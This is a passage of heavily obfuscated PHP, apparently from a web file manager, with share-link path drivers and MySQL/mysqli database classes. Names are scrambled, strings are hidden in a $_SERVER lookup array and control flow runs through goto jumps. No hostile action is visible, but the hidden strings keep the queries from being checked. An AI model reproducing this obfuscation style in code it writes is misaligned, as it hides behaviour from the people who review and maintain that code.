$c¾·Ï¨Šï[1219], $c¾·Ï¨Šï[518], $c¾·Ï¨Šï[520], $c¾·Ï¨Šï[1220], $c¾·Ï¨Šï[107], $c¾·Ï¨Šï[1221], $c¾·Ï¨Šï[1222]); if (in_array($BÎïÊ´²±, $cì·µÒ¤’)) { $b‰„‹‹çøÊ = $this->getPathOuter($b‰„‹‹çøÊ); } return $b‰„‹‹çøÊ; } public function copy($C­¬»‡Î±•, $D®˜£êÉ¾Í, $fç±ĞÙÙÄá = false) { return $this->copyMove($C­¬»‡Î±•, $D®˜£êÉ¾Í, $fç±ĞÙÙÄá, $_SERVER[œº][518]); } public function move($a¹Ô†“†¼¡, $Bƒ¯Ú æîë, $a¿Ú·³º‹ = false) { return $this->copyMove($a¹Ô†“†¼¡, $Bƒ¯Ú æîë, $a¿Ú·³º‹, $_SERVER[œº][520]); } private function copyMove($AÙ¥÷¾àÜ’, $EíàÜËÍÙ˜, $aî¥ôáñöÌ, $EŠˆÂğ…“´) { goto c¬ˆ‰Ÿ‡Ï›; BØ‹Ğ¹ƒ×: return $EÄÊ¯ÖÑ³Ã; goto fˆÀ¿—Ä£ã; c¬ˆ‰Ÿ‡Ï›: $b‡í©™•§ =& $_SERVER[œº]; $AÃ¡ë‚šåÎ = $EíàÜËÍÙ˜; $DÆÍ¨ÑÔÂ¤ = IO::driverMake($EíàÜËÍÙ˜); goto E¼åå£àÇ„; E¼åå£àÇ„: if ($DÆÍ¨ÑÔÂ¤->pathParse[$b‡í©™•§[1048]]) { $EíàÜËÍÙ˜ = $DÆÍ¨ÑÔÂ¤->pathParse[$b‡í©™•§[1048]]; } else { $EíàÜËÍÙ˜ = $AÃ¡ë‚šåÎ; } $EÄÊ¯ÖÑ³Ã = IO::copyMove($AÙ¥÷¾àÜ’, $EíàÜËÍÙ˜, $aî¥ôáñöÌ, $EŠˆÂğ…“´); $EÄÊ¯ÖÑ³Ã = $this->getPathOuter($EÄÊ¯ÖÑ³Ã); goto BØ‹Ğ¹ƒ×; fˆÀ¿—Ä£ã: } public function pathThis($Eƒ°Ô –Ü­) { return get_path_this($this->pathParse[$_SERVER[œº][76]]); } public function pathFather($d„Ô½‰ñ¾Ÿ) { return get_path_father($this->pathParse[$_SERVER[œº][76]]); } public function iconvSystem($a¬‚ÅÓÛ»Ô) { return $a¬‚ÅÓÛ»Ô; } protected function infoParse($D×‰¥“óè·, $bÜ‚¼©·‰¾ = false) { $B‰¿”»¡’À =& $_SERVER[œº]; $Dá‹—æ¤£Æ = $this->pathParse[$B‰¿”»¡’À[466]][$B‰¿”»¡’À[1071]] . $this->pathParse[$B‰¿”»¡’À[1064]]; if ($bÜ‚¼©·‰¾) { $dÈò¬ÚßÀ = IO::infoWithChildren($Dá‹—æ¤£Æ); } else { $dÈò¬ÚßÀ = IO::info($Dá‹—æ¤£Æ); } $Aù™ù«Ì©Ğ = $this->pathParse[$B‰¿”»¡’À[466]]; return Action($B‰¿”»¡’À[1214])->_shareItemeParse($dÈò¬ÚßÀ, $Aù™ù«Ì©Ğ); } public function listAll($B³˜×ë¬Ğ¨) { $dŒ¢‚ß´´ =& $_SERVER[œº]; $Bñß–Ú²’ = IO::listAll($B³˜×ë¬Ğ¨); $A¶ß·Ş¥Ÿ = $this->pathParse[$dŒ¢‚ß´´[466]]; foreach ($Bñß–Ú²’ as &$fÑÙ®—İ») { check_abort(); $eŸš«œÔµ÷ = IO::info($fÑÙ®—İ»[$dŒ¢‚ß´´[76]]); $eŸš«œÔµ÷ = is_array($eŸš«œÔµ÷) ? $eŸš«œÔµ÷ : array(); $fÑÙ®—İ» = array_merge($eŸš«œÔµ÷, $fÑÙ®—İ»); $fÑÙ®—İ»[$dŒ¢‚ß´´[85]] = Action($dŒ¢‚ß´´[1214])->_shareItemeParse($fÑÙ®—İ», $A¶ß·Ş¥Ÿ); } unset($fÑÙ®—İ»); return $Bñß–Ú²’; } public function getPathOuter($E¡ö·ĞÅÃ) { goto EìÊ¤õœ¯Ì; b´£¶í‰: if (substr($d‰î‡´à»Ï, 0, strlen($dÃƒ°¹’³Ğ)) != $dÃƒ°¹’³Ğ) { return !1; } return $this->pathParse[$aµ‹Åè“¡[1065]] . $aµ‹Åè“¡[8] . ltrim($cÒ­Ø•Ì‹Š, $aµ‹Åè“¡[8]); goto dÖŒÎ¢İ¦™; EìÊ¤õœ¯Ì: $aµ‹Åè“¡ =& $_SERVER[œº]; $FÛ‘¬æŸ–È = KodIO::parse($E¡ö·ĞÅÃ); if ($FÛ‘¬æŸ–È[$aµ‹Åè“¡[29]] == KodIO::KOD_SHARE_ITEM) { return $FÛ‘¬æŸ–È[$aµ‹Åè“¡[76]]; } goto eÑ„Ğ¾›âË; eÑ„Ğ¾›âË: $d‰î‡´à»Ï = KodIO::clear($E¡ö·ĞÅÃ); $dÃƒ°¹’³Ğ = KodIO::clear($this->pathParse[$aµ‹Åè“¡[466]][$aµ‹Åè“¡[1071]]); $cÒ­Ø•Ì‹Š = substr($d‰î‡´à»Ï, strlen($dÃƒ°¹’³Ğ)); goto b´£¶í‰; dÖŒÎ¢İ¦™: } public function getType() { $e‘¼Æäœèå =& $_SERVER[œº]; $BÌ¹öÜ÷©Ÿ = str_replace($e‘¼Æäœèå[72], $e‘¼Æäœèå[33], get_class($this)); return strtolower($BÌ¹öÜ÷©Ÿ); } public function isTypeObject($cÕè¨óÇä´) { return IO::isTypeObject($cÕè¨óÇä´); } public function info($B°ëˆ““¦³) { return $this->infoParse($B°ëˆ““¦³); } public function infoAuth($eÕÌËßâ÷) { return $this->infoParse($eÕÌËßâ÷); } public function infoWithChildren($bÓ‡ÊÅôÉ) { return $this->infoParse($bÓ‡ÊÅôÉ, !0); } public function infoFull($DŒ´µÌ½±–) { return $this->infoParse($DŒ´µÌ½±–); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bÙ÷ÍÁ±˜Ü) { $this->pathParse = $bÙ÷ÍÁ±˜Ü; } protected function infoParse($DØÅÌ‚ÅÔç, $EÉ®İÏ’¸‘ = false) { $E«å¾¯Ì•Â =& $_SERVER[œº]; return Action($E«å¾¯Ì•Â[1070])->sharePathInfo($this->pathParse[$E«å¾¯Ì•Â[76]], !0, $EÉ®İÏ’¸‘); } public function listPath($BÍØ¨Œ, $D¹í«™®À† = false) { $eŠ®œ®îŒ’ =& $_SERVER[œº]; $a”Ï±óÏà = IO::listPath($BÍØ¨Œ, $D¹í«™®À†); foreach ($a”Ï±óÏà as $Aâéá‰é => $D™å”™ö¨°) { if (!in_array($Aâéá‰é, array($eŠ®œ®îŒ’[74], $eŠ®œ®îŒ’[75]))) { continue; } foreach ($D™å”™ö¨° as $Eò÷öÑùçá => $DÀªÛ—ÒçØ) { $DÀªÛ—ÒçØ = Action($eŠ®œ®îŒ’[1223])->parsePathChildren($DÀªÛ—ÒçØ, array($eŠ®œ®îŒ’[414] => $BÍØ¨Œ)); $a”Ï±óÏà[$Aâéá‰é][$Eò÷öÑùçá] = Action($eŠ®œ®îŒ’[1070])->shareItemInfo($DÀªÛ—ÒçØ); } } return $a”Ï±óÏà; } public function listAll($bÄç˜Èø¥·) { $eçöñ´å–¶ =& $_SERVER[œº]; $Eí²È„ÚŸÁ = IO::listAll($bÄç˜Èø¥·); foreach ($Eí²È„ÚŸÁ as &$AÅÔ‚ÛÌ²Ÿ) { $FøÏ„±Ù = IO::info($AÅÔ‚ÛÌ²Ÿ[$eçöñ´å–¶[76]]); $FøÏ„±Ù = is_array($FøÏ„±Ù) ? $FøÏ„±Ù : array(); $AÅÔ‚ÛÌ²Ÿ = array_merge($FøÏ„±Ù, $AÅÔ‚ÛÌ²Ÿ); $AÅÔ‚ÛÌ²Ÿ[$eçöñ´å–¶[85]] = Action($eçöñ´å–¶[1070])->shareItemInfo($AÅÔ‚ÛÌ²Ÿ); } unset($AÅÔ‚ÛÌ²Ÿ); return $Eí²È„ÚŸÁ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($bğš””İ•…) { parent::__construct($bğš””İ•…); } } goto C—…Ç™‰; dŒÏ¼ÇŒ—²: class DbMysql extends Db { public function __construct($d‘Ì½ª°Ë = '') { $f¹à¶—¦µÊ =& $_SERVER[œº]; if (!extension_loaded($f¹à¶—¦µÊ[759])) { think_exception(think_lang($f¹à¶—¦µÊ[10]) . $f¹à¶—¦µÊ[845]); } if (!empty($d‘Ì½ª°Ë)) { $this->config = $d‘Ì½ª°Ë; if (empty($this->config[$f¹à¶—¦µÊ[13]])) { $this->config[$f¹à¶—¦µÊ[13]] = $f¹à¶—¦µÊ[33]; } } } public function connect($fåßã­¢‹‚ = '', $cßÀß›¨†× = 0, $f¿‚‰áÒ¢Ç = false) { $dŒ÷–¹«È =& $_SERVER[œº]; if (!isset($this->linkID[$cßÀß›¨†×])) { goto CØ•‰è•Œ; f©ÕŸäÅŠÅ: if (1 != think_config($dŒ÷–¹«È[18])) { unset($this->config); } goto b˜Ÿ®Šè­; CØ•‰è•Œ: if (empty($fåßã­¢‹‚)) { $fåßã­¢‹‚ = $this->config; } $FáÚÛæ½¢ª = $fåßã­¢‹‚[$dŒ÷–¹«È[846]] . ($fåßã­¢‹‚[$dŒ÷–¹«È[847]] ? "\x3a{$fåßã­¢‹‚[$dŒ÷–¹«È[847]]}" : $dŒ÷–¹«È[33]); $C‚ßáÊ ¼ô = !empty($fåßã­¢‹‚[$dŒ÷–¹«È[13]][$dŒ÷–¹«È[14]]) ? $fåßã­¢‹‚[$dŒ÷–¹«È[13]][$dŒ÷–¹«È[14]] : $this->pconnect; goto FÈù›’ Œ˜; c³âÓ›åÆğ: mysql_query($dŒ÷–¹«È[850] . think_config($dŒ÷–¹«È[851]) . $dŒ÷–¹«È[55], $this->linkID[$cßÀß›¨†×]); if ($a¾ÛùÄÔÎİ > $dŒ÷–¹«È[852]) { mysql_query($dŒ÷–¹«È[853], $this->linkID[$cßÀß›¨†×]); } $this->connected = !0; goto f©ÕŸäÅŠÅ; FÈù›’ Œ˜: if ($C‚ßáÊ ¼ô) { $this->linkID[$cßÀß›¨†×] = mysql_pconnect($FáÚÛæ½¢ª, $fåßã­¢‹‚[$dŒ÷–¹«È[848]], $fåßã­¢‹‚[$dŒ÷–¹«È[849]], 131072); } else { $this->linkID[$cßÀß›¨†×] = mysql_connect($FáÚÛæ½¢ª, $fåßã­¢‹‚[$dŒ÷–¹«È[848]], $fåßã­¢‹‚[$dŒ÷–¹«È[849]], !0, 131072); } if (!$this->linkID[$cßÀß›¨†×] || !empty($fåßã­¢‹‚[$dŒ÷–¹«È[17]]) && !mysql_select_db($fåßã­¢‹‚[$dŒ÷–¹«È[17]], $this->linkID[$cßÀß›¨†×])) { think_exception(mysql_error()); } $a¾ÛùÄÔÎİ = mysql_get_server_info($this->linkID[$cßÀß›¨†×]); goto c³âÓ›åÆğ; b˜Ÿ®Šè­: } return $this->linkID[$cßÀß›¨†×]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eœ–¼È•ø­) { goto A‡ÙªÅÕîõ; A‡ÙªÅÕîõ: $BæÈ£„Îâ =& $_SERVER[œº]; if (0 === stripos($eœ–¼È•ø­, $BæÈ£„Îâ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fÍÍ“Í; BµÄĞ—ÂŒ»: think_action_status($BæÈ£„Îâ[19], 1); think_status($BæÈ£„Îâ[20]); $this->queryID = mysql_query($eœ–¼È•ø­, $this->_linkID); goto aÙ®íÒŒ†; aÙ®íÒŒ†: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c¨ë’ªä‡; fÍÍ“Í: if (!$this->_linkID) { return !1; } $this->queryStr = $eœ–¼È•ø­; if ($this->queryID) { $this->free(); } goto BµÄĞ—ÂŒ»; c¨ë’ªä‡: } public function execute($CçŠºëõğ) { goto Aº¹Ş¾ò°¸; Aº¹Ş¾ò°¸: $F·“¿¼ŸîÅ =& $_SERVER[œº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eİå‹¥½îÒ; eİå‹¥½îÒ: $this->queryStr = $CçŠºëõğ; if ($this->queryID) { $this->free(); } think_action_status($F·“¿¼ŸîÅ[21], 1); goto cˆÜ¬ÇÛ³‡; cˆÜ¬ÇÛ³‡: think_status($F·“¿¼ŸîÅ[20]); $AçğÓ·‰¤ = mysql_query($CçŠºëõğ, $this->_linkID); $this->debug(); goto E…–Ò™Íµˆ; E…–Ò™Íµˆ: if (!1 === $AçğÓ·‰¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dˆ••›¦‘•; dˆ••›¦‘•: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[œº][854], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F¶‹éâ¤©§ = mysql_query($_SERVER[œº][855], $this->_linkID); $this->transTimes = 0; if (!$F¶‹éâ¤©§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÌÁâ¤· = mysql_query($_SERVER[œº][856], $this->_linkID); $this->transTimes = 0; if (!$CÌÁâ¤·) { $this->error(); return !1; } } return !0; } private function getAll() { $EÉŸÏ·¹Öª = array(); if ($this->numRows > 0) { while ($B“Ô­Í…ãà = mysql_fetch_assoc($this->queryID)) { $EÉŸÏ·¹Öª[] = $B“Ô­Í…ãà; } mysql_data_seek($this->queryID, 0); } return $EÉŸÏ·¹Öª; } public function getFields($fåÔÇÎß) { $C¬’×—­‚Š =& $_SERVER[œº]; $fß©ÊêÇ¤ = $this->query($C¬’×—­‚Š[857] . $this->parseKey($fåÔÇÎß)); $Fš÷¡äÕÅ = array(); if ($fß©ÊêÇ¤) { foreach ($fß©ÊêÇ¤ as $Fß±ÍÆÕ¤ => $D§’‘Ì¶²‚) { $Fš÷¡äÕÅ[$D§’‘Ì¶²‚[$C¬’×—­‚Š[27]]] = array($C¬’×—­‚Š[28] => $D§’‘Ì¶²‚[$C¬’×—­‚Š[27]], $C¬’×—­‚Š[29] => $D§’‘Ì¶²‚[$C¬’×—­‚Š[30]], $C¬’×—­‚Š[31] => (bool) (strtoupper($D§’‘Ì¶²‚[$C¬’×—­‚Š[32]]) === $C¬’×—­‚Š[858]), $C¬’×—­‚Š[34] => $D§’‘Ì¶²‚[$C¬’×—­‚Š[35]], $C¬’×—­‚Š[36] => strtolower($D§’‘Ì¶²‚[$C¬’×—­‚Š[37]]) == $C¬’×—­‚Š[38], $C¬’×—­‚Š[39] => strtolower($D§’‘Ì¶²‚[$C¬’×—­‚Š[40]]) == $C¬’×—­‚Š[41]); } } return $Fš÷¡äÕÅ; } public function getTables($aÃ£Ï”¨È = '') { $DµÀñ‡·µà =& $_SERVER[œº]; if (!empty($aÃ£Ï”¨È)) { $Eˆ‹÷Ã›î = $DµÀñ‡·µà[859] . $aÃ£Ï”¨È . $DµÀñ‡·µà[860]; } else { $Eˆ‹÷Ã›î = $DµÀñ‡·µà[861]; } $dó’Íˆƒ—™ = $this->query($Eˆ‹÷Ã›î); $cŒ•Äšæ  = array(); foreach ($dó’Íˆƒ—™ as $f„ØÃ‰Á©Ö => $B÷‡Å•’ÏÊ) { $cŒ•Äšæ [$f„ØÃ‰Á©Ö] = current($B÷‡Å•’ÏÊ); } return $cŒ•Äšæ ; } public function replace($C³µ½­óº, $F¼Ó¸Ö¹ = array()) { $dïùÙ«³ˆÔ =& $_SERVER[œº]; foreach ($C³µ½­óº as $DÜÇß×¡ÃÑ => $eê„•Ú´áî) { $d¥‘çæİŞ = $this->parseValue($eê„•Ú´áî); if (is_scalar($d¥‘çæİŞ)) { $a¯‡õ‡ĞÈ [] = $d¥‘çæİŞ; $CÆºÏ²Æ½İ[] = $this->parseKey($DÜÇß×¡ÃÑ); } } $AªÔŸ£Ïâ = $dïùÙ«³ˆÔ[862] . $this->parseTable($F¼Ó¸Ö¹[$dïùÙ«³ˆÔ[277]]) . $dïùÙ«³ˆÔ[863] . implode($dïùÙ«³ˆÔ[47], $CÆºÏ²Æ½İ) . $dïùÙ«³ˆÔ[864] . implode($dïùÙ«³ˆÔ[47], $a¯‡õ‡ĞÈ ) . $dïùÙ«³ˆÔ[865]; return $this->execute($AªÔŸ£Ïâ); } public function insertAll($dƒèÛ»£ø‡, $DĞğ½ï­¢ = array(), $bèœÑˆ­× = false) { goto C“ŠÑšèğ¼; C“ŠÑšèğ¼: $Eƒİ³´ó¯æ =& $_SERVER[œº]; if (!is_array($dƒèÛ»£ø‡[0])) { return !1; } $EóÉÁêŸØ´ = array_keys($dƒèÛ»£ø‡[0]); goto BòÓŠçÕˆ”; BòÓŠçÕˆ”: $c¤ñóÇŠ¿ß = array(); foreach ($dƒèÛ»£ø‡ as $bĞ»ñºÏ¿) { $A—šõªÊ¸ = array(); foreach ($bĞ»ñºÏ¿ as $aÓË¿çŒ¬ => $bÉ²ÛÕÒ) { $bÉ²ÛÕÒ = $this->parseValue($bÉ²ÛÕÒ); if (is_scalar($bÉ²ÛÕÒ)) { $A—šõªÊ¸[] = $bÉ²ÛÕÒ; } } $c¤ñóÇŠ¿ß[] = $Eƒİ³´ó¯æ[258] . implode($Eƒİ³´ó¯æ[47], $A—šõªÊ¸) . $Eƒİ³´ó¯æ[865]; } array_walk($EóÉÁêŸØ´, array($this, $Eƒİ³´ó¯æ[866])); goto c¼ƒâãÀÒ; c¼ƒâãÀÒ: $FÍÔ–«„¥ = ($bèœÑˆ­× ? $Eƒİ³´ó¯æ[867] : $Eƒİ³´ó¯æ[868]) . $Eƒİ³´ó¯æ[869] . $this->parseTable($DĞğ½ï­¢[$Eƒİ³´ó¯æ[277]]) . $Eƒİ³´ó¯æ[863] . implode($Eƒİ³´ó¯æ[47], $EóÉÁêŸØ´) . $Eƒİ³´ó¯æ[870] . implode($Eƒİ³´ó¯æ[47], $c¤ñóÇŠ¿ß); return $this->execute($FÍÔ–«„¥); goto a¸Ñæ¹ø¼¼; a¸Ñæ¹ø¼¼: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $DÙ»ß©º˜ò =& $_SERVER[œº]; $this->error = mysql_errno() . $DÙ»ß©º˜ò[4] . mysql_error($this->_linkID); if ($DÙ»ß©º˜ò[33] != $this->queryStr) { $this->error .= LNG($DÙ»ß©º˜ò[45]) . $this->queryStr; } think_trace($this->error, $DÙ»ß©º˜ò[33], $DÙ»ß©º˜ò[46]); return $this->error; } public function escapeString($E…ÇÆ¼ªâ¯) { if ($this->_linkID) { return mysql_real_escape_string($E…ÇÆ¼ªâ¯, $this->_linkID); } else { return mysql_escape_string($E…ÇÆ¼ªâ¯); } } public function parseKey(&$dáËİµê¢, $dìŒ‰åë´¶ = true) { $e…¹Ùåæ„Ø =& $_SERVER[œº]; if ($dìŒ‰åë´¶) { $dáËİµê¢ = $this->parseKeyCheck($dáËİµê¢); } if ($dáËİµê¢ != $e…¹Ùåæ„Ø[182] && !preg_match($e…¹Ùåæ„Ø[871], $dáËİµê¢)) { $dáËİµê¢ = $e…¹Ùåæ„Ø[382] . trim($dáËİµê¢, $e…¹Ùåæ„Ø[382]) . $e…¹Ùåæ„Ø[382]; } return $dáËİµê¢; } } class DbMysqli extends Db { public function __construct($Dáß½‰è· = '') { $d˜Ó½âÚŠ¹ =& $_SERVER[œº]; if (!extension_loaded($d˜Ó½âÚŠ¹[758])) { think_exception(think_lang($d˜Ó½âÚŠ¹[10]) . $d˜Ó½âÚŠ¹[872]); } if (!empty($Dáß½‰è·)) { $this->config = $Dáß½‰è·; if (empty($this->config[$d˜Ó½âÚŠ¹[13]])) { $this->config[$d˜Ó½âÚŠ¹[13]] = $d˜Ó½âÚŠ¹[33]; } } } public function connect($eÚ†Ğ£å = '', $b¹Ãö¶¨–İ = 0) { $bîÀ°Ñ“íğ =& $_SERVER[œº]; if (!isset($this->linkID[$b¹Ãö¶¨–İ])) { goto aº³¬ë”Œ; d°ºœİÂÓå: $this->connected = !0; if (1 != think_config($bîÀ°Ñ“íğ[18])) { unset($this->config); } goto D‹îÔ¾Îéğ; aº³¬ë”Œ: if (empty($eÚ†Ğ£å)) { $eÚ†Ğ£å = $this->config; } $this->linkID[$b¹Ãö¶¨–İ] = new mysqli($eÚ†Ğ£å[$bîÀ°Ñ“íğ[846]], $eÚ†Ğ£å[$bîÀ°Ñ“íğ[848]], $eÚ†Ğ£å[$bîÀ°Ñ“íğ[849]], $eÚ†Ğ£å[$bîÀ°Ñ“íğ[17]], $eÚ†Ğ£å[$bîÀ°Ñ“íğ[847]] ? intval($eÚ†Ğ£å[$bîÀ°Ñ“íğ[847]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto cÙŠĞ„ëÑ«; cÙŠĞ„ëÑ«: $bÆ…”°Œ±ø = $this->linkID[$b¹Ãö¶¨–İ]->server_version; $this->linkID[$b¹Ãö¶¨–İ]->query($bîÀ°Ñ“íğ[850] . think_config($bîÀ°Ñ“íğ[851]) . $bîÀ°Ñ“íğ[55]); if ($bÆ…”°Œ±ø > $bîÀ°Ñ“íğ[852]) { $this->linkID[$b¹Ãö¶¨–İ]->query($bîÀ°Ñ“íğ[853]); } goto d°ºœİÂÓå; D‹îÔ¾Îéğ: } return $this->linkID[$b¹Ãö¶¨–İ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fŒ†–ÒÃ¢) { goto e¶¢î¿÷ÛÖ; e¶¢î¿÷ÛÖ: $cŞ›ÀöˆÏˆ =& $_SERVER[œº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AÛ­ñ¤ï Û; AÛ­ñ¤ï Û: $this->queryStr = $fŒ†–ÒÃ¢; if ($this->queryID) { $this->free(); } think_action_status($cŞ›ÀöˆÏˆ[19], 1); goto BÕÒŠª®×; BÕÒŠª®×: think_status($cŞ›ÀöˆÏˆ[20]); $this->queryID = $this->_linkID->query($fŒ†–ÒÃ¢); if ($this->_linkID->more_results()) { while (($dğ…§áæå‚ = $this->_linkID->next_result()) != NULL) { $dğ…§áæå‚->free_result(); } } goto b£Ä›ßíˆÂ; b£Ä›ßíˆÂ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¢œÜ†¿; F¢œÜ†¿: } public function execute($Eé‚»æİ‡Ë) { goto a±¢ã™¯ÁÌ; a•˜ººâ´‰: think_status($c†Áîç…Æ²[20]); $Cãäˆ¾„¶´ = $this->_linkID->query($Eé‚»æİ‡Ë); $this->debug(); goto B¢Ñ…‹¬°é; a÷·¡À‹‚: $this->queryStr = $Eé‚»æİ‡Ë; if ($this->queryID) { $this->free(); } think_action_status($c†Áîç…Æ²[21], 1); goto a•˜ººâ´‰; a±¢ã™¯ÁÌ: $c†Áîç…Æ² =& $_SERVER[œº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a÷·¡À‹‚; B¢Ñ…‹¬°é: if (!1 === $Cãäˆ¾„¶´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto e˜†µÈ±À; e˜†µÈ±À: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FŞäÓ‚Œ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$FŞäÓ‚Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŸêéğ¡ó = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FŸêéğ¡ó) { $this->error(); return !1; } } return !0; } private function getAll() { $B¥ÃìˆáÉÃ = array(); if ($this->numRows > 0) { for ($F´‹š¥¥ğ° = 0; $F´‹š¥¥ğ° < $this->numRows; $F´‹š¥¥ğ°++) { $B¥ÃìˆáÉÃ[$F´‹š¥¥ğ°] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B¥ÃìˆáÉÃ; } public function getFields($C¿Ç™³Ä•…) { $fÙœİíÆŠÍ =& $_SERVER[œº]; $b¦Œ„½í… = $this->query($fÙœİíÆŠÍ[857] . $this->parseKey($C¿Ç™³Ä•…)); $EÒËºÉ‹ª‹ = array(); if ($b¦Œ„½í…) { foreach ($b¦Œ„½í… as $AèÖÚ¸á«Æ => $A”§îµÑôµ) { $EÒËºÉ‹ª‹[$A”§îµÑôµ[$fÙœİíÆŠÍ[27]]] = array($fÙœİíÆŠÍ[28] => $A”§îµÑôµ[$fÙœİíÆŠÍ[27]], $fÙœİíÆŠÍ[29] => $A”§îµÑôµ[$fÙœİíÆŠÍ[30]], $fÙœİíÆŠÍ[31] => (bool) ($A”§îµÑôµ[$fÙœİíÆŠÍ[32]] === $fÙœİíÆŠÍ[33]), $fÙœİíÆŠÍ[34] => $A”§îµÑôµ[$fÙœİíÆŠÍ[35]], $fÙœİíÆŠÍ[36] => strtolower($A”§îµÑôµ[$fÙœİíÆŠÍ[37]]) == $fÙœİíÆŠÍ[38], $fÙœİíÆŠÍ[39] => strtolower($A”§îµÑôµ[$fÙœİíÆŠÍ[40]]) == $fÙœİíÆŠÍ[41]); } } return $EÒËºÉ‹ª‹; } public function getTables($bÃö›Û¼‡ï = '') { $B©¡‡ñ¸… =& $_SERVER[œº]; $Dê³Úõæ‡º = !empty($bÃö›Û¼‡ï) ? $B©¡‡ñ¸…[859] . $bÃö›Û¼‡ï . $B©¡‡ñ¸…[860] : $B©¡‡ñ¸…[861]; $c…ƒ×‰Û§‹ = $this->query($Dê³Úõæ‡º); $c××¹·Ä­ = array(); if ($c…ƒ×‰Û§‹) { foreach ($c…ƒ×‰Û§‹ as $fˆ¦¸…ÚŒæ => $fõ’á–º•) { $c××¹·Ä­[$fˆ¦¸…ÚŒæ] = current($fõ’á–º•); } } return $c××¹·Ä­; } public function replace($F”‹†‘èÅ, $a‹³Ò²ˆ¬— = array()) { $EÃ»‘¦Œ‚ô =& $_SERVER[œº]; foreach ($F”‹†‘èÅ as $BÈß¦Ş¿É => $Aà‘¡İ¹Ö) { $aŞø‹ì‡ñ‰ = $this->parseValue($Aà‘¡İ¹Ö); if (is_scalar($aŞø‹ì‡ñ‰)) { $fˆø„×ï±¯[] = $aŞø‹ì‡ñ‰; $E¼¸’¡›š¼[] = $this->parseKey($BÈß¦Ş¿É); } } $bµãááŸ¯ = $EÃ»‘¦Œ‚ô[862] . $this->parseTable($a‹³Ò²ˆ¬—[$EÃ»‘¦Œ‚ô[277]]) . $EÃ»‘¦Œ‚ô[863] . implode($EÃ»‘¦Œ‚ô[47], $E¼¸’¡›š¼) . $EÃ»‘¦Œ‚ô[864] . implode($EÃ»‘¦Œ‚ô[47], $fˆø„×ï±¯) . $EÃ»‘¦Œ‚ô[865]; return $this->execute($bµãááŸ¯); } public function insertAll($EêÚÀŒ•š¬, $ağ—ÁÖ¡¯Ğ = array(), $dñÑõ´Æ¥” = false) { goto AÁáÛ…çº³; bÔ™èòˆÍ÷: $e‘æ‚·¹ì› = array(); foreach ($EêÚÀŒ•š¬ as $fÀª…Ã‰Œ) { $a‹•ºÙ±Òğ = array(); foreach ($fÀª…Ã‰Œ as $A¢Ş«Ê¥ => $F­‘ÛÅƒ†) { $F­‘ÛÅƒ† = $this->parseValue($F­‘ÛÅƒ†); if (is_scalar($F­‘ÛÅƒ†)) { $a‹•ºÙ±Òğ[] = $F­‘ÛÅƒ†; } } $e‘æ‚·¹ì›[] = $bŸï’¿³£Ì[258] . implode($bŸï’¿³£Ì[47], $a‹•ºÙ±Òğ) . $bŸï’¿³£Ì[865]; } array_walk($d÷ƒÄ˜, array($this, $bŸï’¿³£Ì[866])); goto Aë†Ü±‘‘·; Aë†Ü±‘‘·: $dËğİ•ò¬â = $dñÑõ´Æ¥” ? $bŸï’¿³£Ì[867] : $bŸï’¿³£Ì[868]; $Cíä¹¹øøš = $dËğİ•ò¬â . $bŸï’¿³£Ì[869] . $this->parseTable($ağ—ÁÖ¡¯Ğ[$bŸï’¿³£Ì[277]]) . $bŸï’¿³£Ì[863] . implode($bŸï’¿³£Ì[47], $d÷ƒÄ˜) . $bŸï’¿³£Ì[870] . implode($bŸï’¿³£Ì[47], $e‘æ‚·¹ì›); return $this->execute($Cíä¹¹øøš); goto fÒ‡ƒîªËª; AÁáÛ…çº³: $bŸï’¿³£Ì =& $_SERVER[œº]; if (!is_array($EêÚÀŒ•š¬[0])) { return !1; } $d÷ƒÄ˜ = array_keys($EêÚÀŒ•š¬[0]); goto bÔ™èòˆÍ÷; fÒ‡ƒîªËª: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D¢Í³ÕÀå¢ =& $_SERVER[œº]; $this->error = $this->_linkID->errno . $D¢Í³ÕÀå¢[4] . $this->_linkID->error; if ($D¢Í³ÕÀå¢[33] != $this->queryStr) { $this->error .= LNG($D¢Í³ÕÀå¢[45]) . $this->queryStr; } think_trace($this->error, $D¢Í³ÕÀå¢[33], $D¢Í³ÕÀå¢[46]); return $this->error; } public function escapeString($c¯ ×÷£·é) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c¯ ×÷£·é); } else { return addslashes($c¯ ×÷£·é); } } public function parseKey(&$B’Ô®È—½ˆ, $BŠßé„¡² = true) { $F¨µÅƒÎ´ê =& $_SERVER[œº]; if ($BŠßé„¡²) { $B’Ô®È—½ˆ = $this->parseKeyCheck($B’Ô®È—½ˆ); } if 